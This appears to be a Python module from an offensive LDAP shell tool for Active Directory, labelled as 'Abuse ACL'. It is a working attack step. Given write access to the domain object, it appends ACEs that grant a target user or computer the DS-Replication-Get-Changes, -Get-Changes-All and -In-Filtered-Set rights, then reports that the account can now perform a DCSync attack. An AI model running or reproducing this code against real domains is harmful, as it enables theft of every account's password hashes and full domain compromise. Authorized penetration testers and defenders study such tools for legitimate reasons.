import logging
from ldap3 import Connection, MODIFY_REPLACE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from typing import Optional
from ldap_shell.prompt import Prompt
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.ace_utils import AceUtils
import ldap_shell.utils.ldaptypes as ldaptypes

class LdapShellModule(BaseLdapModule):
    """Module for set DS-Replication-Get-Changes-All privilege to the target AD user or computer"""
    
    help_text = "If you have write access to the domain object, assign the DS-Replication right to the selected user"
    examples_text = """
    Set DS-Replication-Get-Changes-All privilege to the target AD user
    `set_dcsync john.doe`
    ```
    [INFO] DACL modified successfully! john.doe now has DS-Replication privilege and can perform DCSync attack!
    ```
    """
    module_type = "Abuse ACL" # Get Info, Abuse ACL, Misc and Other.

    class ModuleArgs(BaseModel):
        target: Optional[str] = Field(
            description="Target DN of user or computer",
            arg_type=[ArgumentType.DN]
        )
    
    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict) 
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        if not LdapUtils.check_dn(self.client, self.domain_dumper, self.args.target):
            self.log.error('Invalid DN: %s', self.args.target)
            return

        ldap_attribute = 'nTSecurityDescriptor'
        target_dn = self.domain_dumper.root
        user_dn = self.args.target
        sd_data, domain_root_sid = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, target_dn)
        _, user_sid = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, user_dn)
        
        if sd_data is None:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

        if len(sd_data) < 1:
            raise Exception(f'Check if target have write access to the domain object')
        else:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

        user_name = LdapUtils.get_name_from_dn(user_dn)
        attr_values = []

        sd['Dacl'].aces.append(AceUtils.createACE(sid=user_sid, object_type='1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes-All
        sd['Dacl'].aces.append(AceUtils.createACE(sid=user_sid, object_type='1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes
        sd['Dacl'].aces.append(AceUtils.createACE(sid=user_sid, object_type='89e95b76-444d-4c62-991a-0facbeda640c')) #set DS-Replication-Get-Changes-In-Filtered-Set

        if len(sd['Dacl'].aces) > 0:
            attr_values.append(sd.getData())
        self.client.modify(target_dn, {ldap_attribute: [MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))

        if self.client.result['result'] == 0:
            self.log.info(f'DACL modified successfully! {user_name} now has DS-Replication privilege and can perform DCSync attack!')
        else:
            self.process_error_response()
